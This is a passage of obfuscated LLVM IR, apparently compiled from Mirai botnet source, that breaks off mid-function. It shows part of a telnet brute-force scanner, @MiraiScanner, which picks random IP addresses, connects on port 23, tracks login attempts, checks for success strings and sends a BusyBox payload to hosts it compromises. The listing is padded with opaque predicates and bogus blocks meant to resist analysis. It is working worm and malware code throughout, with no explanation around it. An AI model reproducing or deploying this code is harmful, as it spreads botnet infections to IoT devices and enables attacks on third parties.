  %1278 = or i1 %1276, %1277
  br i1 %1278, label %originalBBpart2142, label %originalBB140alteredBB

originalBBpart2142:                               ; preds = %originalBB140
  br i1 %1270, label %1279, label %1280

; <label>:1279:                                   ; preds = %originalBBpart2142
  br label %1280

; <label>:1280:                                   ; preds = %1279, %originalBBpart2142
  %1281 = load i32, i32* %6, align 4
  %1282 = sext i32 %1281 to i64
  %1283 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1282
  call void @reset_telstate(%struct.telstate_t* %1283)
  br label %1284

; <label>:1284:                                   ; preds = %1280, %1245
  br label %1285

; <label>:1285:                                   ; preds = %1284, %originalBBpart2122, %originalBBpart2110, %846, %788, %669, %originalBBpart259, %511, %originalBBpart224, %138
  br label %1286

; <label>:1286:                                   ; preds = %1285, %originalBBpart2138, %1082, %originalBBpart2118, %originalBBpart2106, %842, %originalBBpart298, %originalBBpart271, %665, %637, %580, %476, %472, %261, %214, %201
  %1287 = load i32, i32* @x.91
  %1288 = load i32, i32* @y.92
  %1289 = sub i32 %1287, 1
  %1290 = mul i32 %1287, %1289
  %1291 = urem i32 %1290, 2
  %1292 = icmp eq i32 %1291, 0
  %1293 = icmp slt i32 %1288, 10
  %1294 = or i1 %1292, %1293
  br i1 %1294, label %originalBB144, label %originalBB144alteredBB

originalBB144:                                    ; preds = %originalBB144alteredBB, %1286
  %1295 = load i32, i32* %6, align 4
  %1296 = add nsw i32 %1295, 1
  store i32 %1296, i32* %6, align 4
  %1297 = load i32, i32* @x.91
  %1298 = load i32, i32* @y.92
  %1299 = sub i32 %1297, 1
  %1300 = mul i32 %1297, %1299
  %1301 = urem i32 %1300, 2
  %1302 = icmp eq i32 %1301, 0
  %1303 = icmp slt i32 %1298, 10
  %1304 = or i1 %1302, %1303
  br i1 %1304, label %originalBBpart2147, label %originalBB144alteredBB

originalBBpart2147:                               ; preds = %originalBB144
  br label %104

; <label>:1305:                                   ; preds = %104
  br label %86
                                                  ; No predecessors!
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %30
  %1307 = load i32, i32* %4, align 4
  store i32 %1307, i32* %5, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %87
  store i32 0, i32* %6, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %108
  %1308 = load i32, i32* %6, align 4
  %1309 = sext i32 %1308 to i64
  %1310 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1309
  %1311 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1310, i32 0, i32 9
  %1312 = load i32, i32* %1311, align 8
  %1313 = icmp eq i32 %1312, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %220
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %284
  %1314 = call i32* @__errno_location() #10
  %1315 = load i32, i32* %1314, align 4
  %1316 = icmp ne i32 %1315, 115
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %308
  %1317 = load i32, i32* %6, align 4
  %1318 = sext i32 %1317 to i64
  %1319 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1318
  call void @advance_telstate(%struct.telstate_t* %1319, i32 1)
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %328
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %346
  %1320 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %1321 = getelementptr inbounds [16 x i64], [16 x i64]* %1320, i64 0, i64 0
  %1322 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %1321) #5, !srcloc !6
  %1323 = extractvalue { i64, i64* } %1322, 0
  %1324 = extractvalue { i64, i64* } %1322, 1
  %1325 = trunc i64 %1323 to i32
  store i32 %1325, i32* %21, align 4
  %1326 = ptrtoint i64* %1324 to i64
  %1327 = trunc i64 %1326 to i32
  store i32 %1327, i32* %22, align 4
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %405
  %1328 = load i32, i32* %6, align 4
  %1329 = sext i32 %1328 to i64
  %1330 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1329
  %1331 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1330, i32 0, i32 9
  store i32 0, i32* %1331, align 8
  store i32 4, i32* %14, align 4
  store i32 0, i32* %15, align 4
  %1332 = load i32, i32* %6, align 4
  %1333 = sext i32 %1332 to i64
  %1334 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1333
  %1335 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1334, i32 0, i32 0
  %1336 = load i32, i32* %1335, align 8
  %1337 = bitcast i32* %15 to i8*
  %1338 = call i32 @getsockopt(i32 %1336, i32 1, i32 4, i8* %1337, i32* %14) #5
  %1339 = load i32, i32* %15, align 4
  %1340 = icmp ne i32 %1339, 0
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %439
  %1341 = load i32, i32* %6, align 4
  %1342 = sext i32 %1341 to i64
  %1343 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1342
  %1344 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1343, i32 0, i32 0
  %1345 = load i32, i32* %1344, align 8
  %1346 = load i32, i32* %6, align 4
  %1347 = sext i32 %1346 to i64
  %1348 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1347
  %1349 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1348, i32 0, i32 0
  %1350 = load i32, i32* %1349, align 8
  %1351 = call i32 (i32, i32, ...) @fcntl(i32 %1350, i32 3, i8* null)
  %_ = sub i32 0, %1351
  %gen = add i32 %_, -2049
  %_35 = sub i32 0, %1351
  %gen36 = add i32 %_35, -2049
  %_37 = shl i32 %1351, -2049
  %_38 = sub i32 %1351, -2049
  %gen39 = mul i32 %_38, -2049
  %_40 = shl i32 %1351, -2049
  %_41 = shl i32 %1351, -2049
  %1352 = and i32 %1351, -2049
  %1353 = call i32 (i32, i32, ...) @fcntl(i32 %1345, i32 4, i32 %1352)
  %1354 = load i32, i32* %6, align 4
  %1355 = sext i32 %1354 to i64
  %1356 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1355
  call void @advance_telstate(%struct.telstate_t* %1356, i32 2)
  br label %originalBB34

originalBB45alteredBB:                            ; preds = %originalBB45, %480
  br label %originalBB45

originalBB49alteredBB:                            ; preds = %originalBB49, %526
  %1357 = call i64 @time(i64* null) #5
  %1358 = trunc i64 %1357 to i32
  %1359 = load i32, i32* %6, align 4
  %1360 = sext i32 %1359 to i64
  %1361 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1360
  %1362 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1361, i32 0, i32 9
  store i32 %1358, i32* %1362, align 8
  %1363 = load i32, i32* %6, align 4
  %1364 = sext i32 %1363 to i64
  %1365 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1364
  %1366 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1365, i32 0, i32 11
  %1367 = load i8*, i8** %1366, align 8
  %1368 = call i32 @contains_fail(i8* %1367)
  %1369 = icmp ne i32 %1368, 0
  br label %originalBB49

originalBB53alteredBB:                            ; preds = %originalBB53, %556
  %1370 = load i32, i32* %6, align 4
  %1371 = sext i32 %1370 to i64
  %1372 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1371
  call void @advance_telstate(%struct.telstate_t* %1372, i32 0)
  br label %originalBB53

originalBB57alteredBB:                            ; preds = %originalBB57, %595
  br label %originalBB57

originalBB61alteredBB:                            ; preds = %originalBB61, %641
  %1373 = load i32, i32* %6, align 4
  %1374 = sext i32 %1373 to i64
  %1375 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1374
  %1376 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1375, i32 0, i32 0
  %1377 = load i32, i32* %1376, align 8
  %1378 = call i64 @send(i32 %1377, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.866, i32 0, i32 0), i64 2, i32 16384)
  %1379 = icmp slt i64 %1378, 0
  br label %originalBB61

originalBB65alteredBB:                            ; preds = %originalBB65, %687
  %1380 = call i64 @time(i64* null) #5
  %1381 = trunc i64 %1380 to i32
  %1382 = load i32, i32* %6, align 4
  %1383 = sext i32 %1382 to i64
  %1384 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1383
  %1385 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1384, i32 0, i32 9
  store i32 %1381, i32* %1385, align 8
  %1386 = load i32, i32* %6, align 4
  %1387 = sext i32 %1386 to i64
  %1388 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1387
  %1389 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1388, i32 0, i32 11
  %1390 = load i8*, i8** %1389, align 8
  %1391 = call i32 @contains_fail(i8* %1390)
  %1392 = icmp ne i32 %1391, 0
  br label %originalBB65

originalBB69alteredBB:                            ; preds = %originalBB69, %725
  br label %originalBB69

originalBB73alteredBB:                            ; preds = %originalBB73, %742
  %1393 = load i32, i32* %6, align 4
  %1394 = sext i32 %1393 to i64
  %1395 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1394
  %1396 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1395, i32 0, i32 9
  %1397 = load i32, i32* %1396, align 8
  %_74 = shl i32 %1397, 7
  %_75 = sub i32 %1397, 7
  %gen76 = mul i32 %_75, 7
  %_77 = sub i32 0, %1397
  %gen78 = add i32 %_77, 7
  %_79 = shl i32 %1397, 7
  %_80 = sub i32 0, %1397
  %gen81 = add i32 %_80, 7
  %_82 = sub i32 %1397, 7
  %gen83 = mul i32 %_82, 7
  %_84 = shl i32 %1397, 7
  %_85 = sub i32 0, %1397
  %gen86 = add i32 %_85, 7
  %_87 = sub i32 0, %1397
  %gen88 = add i32 %_87, 7
  %1398 = add i32 %1397, 7
  %1399 = zext i32 %1398 to i64
  %1400 = call i64 @time(i64* null) #5
  %1401 = icmp slt i64 %1399, %1400
  br label %originalBB73

originalBB92alteredBB:                            ; preds = %originalBB92, %768
  %1402 = load i32, i32* %6, align 4
  %1403 = sext i32 %1402 to i64
  %1404 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1403
  call void @reset_telstate(%struct.telstate_t* %1404)
  br label %originalBB92

originalBB96alteredBB:                            ; preds = %originalBB96, %814
  %1405 = load i32, i32* %6, align 4
  %1406 = sext i32 %1405 to i64
  %1407 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1406
  call void @reset_telstate(%struct.telstate_t* %1407)
  br label %originalBB96

originalBB100alteredBB:                           ; preds = %originalBB100, %882
  %1408 = load i32, i32* %6, align 4
  %1409 = sext i32 %1408 to i64
  %1410 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1409
  %1411 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1410, i32 0, i32 11
  %1412 = load i8*, i8** %1411, align 8
  %1413 = call i32 @contains_success(i8* %1412)
  %1414 = icmp ne i32 %1413, 0
  br label %originalBB100

originalBB104alteredBB:                           ; preds = %originalBB104, %972
  br label %originalBB104

originalBB108alteredBB:                           ; preds = %originalBB108, %1003
  br label %originalBB108

originalBB112alteredBB:                           ; preds = %originalBB112, %1020
  %1415 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i32 0, i32 0
  %1416 = call i32 (i8*, i8*, ...) @sprintf(i8* %1415, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.868, i32 0, i32 0), i8** getelementptr inbounds ([7 x i8*], [7 x i8*]* @Temp_Directorys, i32 0, i32 0)) #5
  %1417 = load i32, i32* %6, align 4
  %1418 = sext i32 %1417 to i64
  %1419 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1418
  %1420 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1419, i32 0, i32 0
  %1421 = load i32, i32* %1420, align 8
  %1422 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i32 0, i32 0
  %1423 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i32 0, i32 0
  %1424 = call i64 @strlen(i8* %1423) #9
  %1425 = call i64 @send(i32 %1421, i8* %1422, i64 %1424, i32 16384)
  %1426 = icmp slt i64 %1425, 0
  br label %originalBB112

originalBB116alteredBB:                           ; preds = %originalBB116, %1049
  %1427 = load i32, i32* %6, align 4
  %1428 = sext i32 %1427 to i64
  %1429 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1428
  call void @reset_telstate(%struct.telstate_t* %1429)
  br label %originalBB116

originalBB120alteredBB:                           ; preds = %originalBB120, %1086
  %1430 = load i32, i32* %6, align 4
  %1431 = sext i32 %1430 to i64
  %1432 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1431
  call void @advance_telstate(%struct.telstate_t* %1432, i32 8)
  br label %originalBB120

originalBB124alteredBB:                           ; preds = %originalBB124, %1120
  br label %originalBB124

originalBB128alteredBB:                           ; preds = %originalBB128, %1145
  br label %originalBB128

originalBB132alteredBB:                           ; preds = %originalBB132, %1162
  %1433 = load i32, i32* %6, align 4
  %1434 = sext i32 %1433 to i64
  %1435 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1434
  %1436 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1435, i32 0, i32 0
  %1437 = load i32, i32* %1436, align 8
  %1438 = load i8*, i8** @Busybox_Payload, align 8
  %1439 = load i8*, i8** @Busybox_Payload, align 8
  %1440 = call i64 @strlen(i8* %1439) #9
  %1441 = call i64 @send(i32 %1437, i8* %1438, i64 %1440, i32 16384)
  %1442 = icmp slt i64 %1441, 0
  br label %originalBB132

originalBB136alteredBB:                           ; preds = %originalBB136, %1189
  %1443 = load i32, i32* %6, align 4
  %1444 = sext i32 %1443 to i64
  %1445 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1444
  call void @reset_telstate(%struct.telstate_t* %1445)
  br label %originalBB136

originalBB140alteredBB:                           ; preds = %originalBB140, %1255
  %1446 = load i32, i32* %6, align 4
  %1447 = sext i32 %1446 to i64
  %1448 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %1447
  %1449 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1448, i32 0, i32 4
  %1450 = load i8, i8* %1449, align 1
  %1451 = zext i8 %1450 to i32
  %1452 = icmp ne i32 %1451, 3
  br label %originalBB140

originalBB144alteredBB:                           ; preds = %originalBB144, %1286
  %1453 = load i32, i32* %6, align 4
  %_145 = shl i32 %1453, 1
  %1454 = add nsw i32 %1453, 1
  store i32 %1454, i32* %6, align 4
  br label %originalBB144
}

; Function Attrs: nounwind
declare i32 @getdtablesize() #3

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #3

; Function Attrs: noinline nounwind uwtable
define void @MiraiScanner(i32, i32) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [128 x i8], align 16
  %11 = alloca i8, align 1
  %12 = alloca %struct.fd_set, align 8
  %13 = alloca %struct.timeval, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [256 x i8], align 16
  %17 = alloca i8*, align 8
  %18 = alloca %struct.sockaddr_in, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca [80 x i8], align 16
  %24 = alloca [80 x i8], align 16
  store i32 %0, i32* %3, align 4
  store i32 %1, i32* %4, align 4
  %25 = call i32 @getdtablesize() #5
  %26 = sub nsw i32 %25, 100
  store i32 %26, i32* %5, align 4
  %27 = load i32, i32* %5, align 4
  %28 = load i32, i32* %4, align 4
  %29 = icmp sgt i32 %27, %28
  br i1 %29, label %30, label %48

; <label>:30:                                     ; preds = %2
  %31 = load i32, i32* @x.93
  %32 = load i32, i32* @y.94
  %33 = sub i32 %31, 1
  %34 = mul i32 %31, %33
  %35 = urem i32 %34, 2
  %36 = icmp eq i32 %35, 0
  %37 = icmp slt i32 %32, 10
  %38 = or i1 %36, %37
  br i1 %38, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %30
  %39 = load i32, i32* %4, align 4
  store i32 %39, i32* %5, align 4
  %40 = load i32, i32* @x.93
  %41 = load i32, i32* @y.94
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %48

; <label>:48:                                     ; preds = %originalBBpart2, %2
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %49, align 4
  %50 = call zeroext i16 @htons(i16 zeroext 23) #10
  %51 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %50, i16* %51, align 2
  %52 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %53 = getelementptr inbounds [8 x i8], [8 x i8]* %52, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %53, i8 0, i64 8, i32 4, i1 false)
  %54 = call noalias i8* @malloc(i64 1025) #5
  store i8* %54, i8** %17, align 8
  %55 = load i8*, i8** %17, align 8
  call void @llvm.memset.p0i8.i64(i8* %55, i8 0, i64 1025, i32 1, i1 false)
  %56 = load i32, i32* %5, align 4
  %57 = zext i32 %56 to i64
  %58 = call i8* @llvm.stacksave()
  store i8* %58, i8** %19, align 8
  %59 = alloca %struct.telstate_t, i64 %57, align 16
  %60 = bitcast %struct.telstate_t* %59 to i8*
  %61 = load i32, i32* %5, align 4
  %62 = sext i32 %61 to i64
  %63 = mul i64 %62, 5
  call void @llvm.memset.p0i8.i64(i8* %60, i8 0, i64 %63, i32 16, i1 false)
  store i32 0, i32* %6, align 4
  br label %64

; <label>:64:                                     ; preds = %98, %48
  %65 = load i32, i32* @x.93
  %66 = load i32, i32* @y.94
  %67 = sub i32 %65, 1
  %68 = mul i32 %65, %67
  %69 = urem i32 %68, 2
  %70 = icmp eq i32 %69, 0
  %71 = icmp slt i32 %66, 10
  %72 = or i1 %70, %71
  br i1 %72, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %64
  %73 = load i32, i32* %6, align 4
  %74 = load i32, i32* %5, align 4
  %75 = icmp slt i32 %73, %74
  %76 = load i32, i32* @x.93
  %77 = load i32, i32* @y.94
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %75, label %84, label %101

; <label>:84:                                     ; preds = %originalBBpart24
  %85 = load i32, i32* %6, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %86
  %88 = bitcast %struct.telstate_t* %87 to i8*
  call void @llvm.memset.p0i8.i64(i8* %88, i8 0, i64 40, i32 8, i1 false)
  %89 = load i32, i32* %6, align 4
  %90 = sext i32 %89 to i64
  %91 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %90
  %92 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %91, i32 0, i32 4
  store i8 1, i8* %92, align 1
  %93 = load i8*, i8** %17, align 8
  %94 = load i32, i32* %6, align 4
  %95 = sext i32 %94 to i64
  %96 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %95
  %97 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %96, i32 0, i32 11
  store i8* %93, i8** %97, align 8
  br label %98

; <label>:98:                                     ; preds = %84
  %99 = load i32, i32* %6, align 4
  %100 = add nsw i32 %99, 1
  store i32 %100, i32* %6, align 4
  br label %64

; <label>:101:                                    ; preds = %originalBBpart24
  br label %102

; <label>:102:                                    ; preds = %originalBBpart2163, %101
  br label %103

; <label>:103:                                    ; preds = %102
  %104 = load i32, i32* @x.93
  %105 = load i32, i32* @y.94
  %106 = sub i32 %104, 1
  %107 = mul i32 %104, %106
  %108 = urem i32 %107, 2
  %109 = icmp eq i32 %108, 0
  %110 = icmp slt i32 %105, 10
  %111 = or i1 %109, %110
  br i1 %111, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %103
  store i32 0, i32* %6, align 4
  %112 = load i32, i32* @x.93
  %113 = load i32, i32* @y.94
  %114 = sub i32 %112, 1
  %115 = mul i32 %112, %114
  %116 = urem i32 %115, 2
  %117 = icmp eq i32 %116, 0
  %118 = icmp slt i32 %113, 10
  %119 = or i1 %117, %118
  br i1 %119, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %120

; <label>:120:                                    ; preds = %1348, %originalBBpart28
  %121 = load i32, i32* %6, align 4
  %122 = load i32, i32* %5, align 4
  %123 = icmp slt i32 %121, %122
  br i1 %123, label %124, label %1351

; <label>:124:                                    ; preds = %120
  %125 = load i32, i32* %6, align 4
  %126 = sext i32 %125 to i64
  %127 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %126
  %128 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %127, i32 0, i32 9
  %129 = load i32, i32* %128, align 8
  %130 = icmp eq i32 %129, 0
  br i1 %130, label %131, label %138

; <label>:131:                                    ; preds = %124
  %132 = call i64 @time(i64* null) #5
  %133 = trunc i64 %132 to i32
  %134 = load i32, i32* %6, align 4
  %135 = sext i32 %134 to i64
  %136 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %135
  %137 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %136, i32 0, i32 9
  store i32 %133, i32* %137, align 8
  br label %138

; <label>:138:                                    ; preds = %131, %124
  %139 = load i32, i32* %6, align 4
  %140 = sext i32 %139 to i64
  %141 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %140
  %142 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %141, i32 0, i32 3
  %143 = load i8, i8* %142, align 4
  %144 = zext i8 %143 to i32
  switch i32 %144, label %1331 [
    i32 0, label %145
    i32 1, label %377
    i32 2, label %562
    i32 3, label %694
    i32 4, label %755
    i32 5, label %855
    i32 6, label %900
    i32 7, label %1054
    i32 8, label %1124
  ]

; <label>:145:                                    ; preds = %138
  %146 = load i32, i32* @x.93
  %147 = load i32, i32* @y.94
  %148 = sub i32 %146, 1
  %149 = mul i32 %146, %148
  %150 = urem i32 %149, 2
  %151 = icmp eq i32 %150, 0
  %152 = icmp slt i32 %147, 10
  %153 = or i1 %151, %152
  br i1 %153, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %145
  %154 = load i32, i32* %6, align 4
  %155 = sext i32 %154 to i64
  %156 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %155
  %157 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %156, i32 0, i32 4
  %158 = load i8, i8* %157, align 1
  %159 = zext i8 %158 to i32
  %160 = icmp eq i32 %159, 1
  %161 = load i32, i32* @x.93
  %162 = load i32, i32* @y.94
  %163 = sub i32 %161, 1
  %164 = mul i32 %161, %163
  %165 = urem i32 %164, 2
  %166 = icmp eq i32 %165, 0
  %167 = icmp slt i32 %162, 10
  %168 = or i1 %166, %167
  br i1 %168, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %160, label %169, label %189

; <label>:169:                                    ; preds = %originalBBpart212
  %170 = load i32, i32* %6, align 4
  %171 = sext i32 %170 to i64
  %172 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %171
  %173 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %172, i32 0, i32 11
  %174 = load i8*, i8** %173, align 8
  store i8* %174, i8** %20, align 8
  %175 = load i32, i32* %6, align 4
  %176 = sext i32 %175 to i64
  %177 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %176
  %178 = bitcast %struct.telstate_t* %177 to i8*
  call void @llvm.memset.p0i8.i64(i8* %178, i8 0, i64 40, i32 8, i1 false)
  %179 = load i8*, i8** %20, align 8
  %180 = load i32, i32* %6, align 4
  %181 = sext i32 %180 to i64
  %182 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %181
  %183 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %182, i32 0, i32 11
  store i8* %179, i8** %183, align 8
  %184 = call i32 @miraifindARandomIP()
  %185 = load i32, i32* %6, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %186
  %188 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %187, i32 0, i32 2
  store i32 %184, i32* %188, align 8
  br label %269

; <label>:189:                                    ; preds = %originalBBpart212
  %190 = load i32, i32* %6, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %191
  %193 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %192, i32 0, i32 4
  %194 = load i8, i8* %193, align 1
  %195 = zext i8 %194 to i32
  %196 = icmp eq i32 %195, 0
  br i1 %196, label %197, label %268

; <label>:197:                                    ; preds = %189
  %198 = load i32, i32* %6, align 4
  %199 = sext i32 %198 to i64
  %200 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %199
  %201 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %200, i32 0, i32 5
  %202 = load i8, i8* %201, align 2
  %203 = add i8 %202, 1
  store i8 %203, i8* %201, align 2
  %204 = load i32, i32* %6, align 4
  %205 = sext i32 %204 to i64
  %206 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %205
  %207 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %206, i32 0, i32 6
  %208 = load i8, i8* %207, align 1
  %209 = add i8 %208, 1
  store i8 %209, i8* %207, align 1
  %210 = load i32, i32* %6, align 4
  %211 = sext i32 %210 to i64
  %212 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %211
  %213 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %212, i32 0, i32 6
  %214 = load i8, i8* %213, align 1
  %215 = zext i8 %214 to i64
  %216 = icmp eq i64 %215, 63
  br i1 %216, label %217, label %238

; <label>:217:                                    ; preds = %197
  %218 = load i32, i32* @x.93
  %219 = load i32, i32* @y.94
  %220 = sub i32 %218, 1
  %221 = mul i32 %218, %220
  %222 = urem i32 %221, 2
  %223 = icmp eq i32 %222, 0
  %224 = icmp slt i32 %219, 10
  %225 = or i1 %223, %224
  br i1 %225, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %217
  %226 = load i32, i32* %6, align 4
  %227 = sext i32 %226 to i64
  %228 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %227
  %229 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %228, i32 0, i32 4
  store i8 1, i8* %229, align 1
  %230 = load i32, i32* @x.93
  %231 = load i32, i32* @y.94
  %232 = sub i32 %230, 1
  %233 = mul i32 %230, %232
  %234 = urem i32 %233, 2
  %235 = icmp eq i32 %234, 0
  %236 = icmp slt i32 %231, 10
  %237 = or i1 %235, %236
  br i1 %237, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %238

; <label>:238:                                    ; preds = %originalBBpart216, %197
  %239 = load i32, i32* %6, align 4
  %240 = sext i32 %239 to i64
  %241 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %240
  %242 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %241, i32 0, i32 5
  %243 = load i8, i8* %242, align 2
  %244 = zext i8 %243 to i64
  %245 = icmp eq i64 %244, 63
  br i1 %245, label %246, label %251

; <label>:246:                                    ; preds = %238
  %247 = load i32, i32* %6, align 4
  %248 = sext i32 %247 to i64
  %249 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %248
  %250 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %249, i32 0, i32 4
  store i8 1, i8* %250, align 1
  br label %1348

; <label>:251:                                    ; preds = %238
  %252 = load i32, i32* @x.93
  %253 = load i32, i32* @y.94
  %254 = sub i32 %252, 1
  %255 = mul i32 %252, %254
  %256 = urem i32 %255, 2
  %257 = icmp eq i32 %256, 0
  %258 = icmp slt i32 %253, 10
  %259 = or i1 %257, %258
  br i1 %259, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %251
  %260 = load i32, i32* @x.93
  %261 = load i32, i32* @y.94
  %262 = sub i32 %260, 1
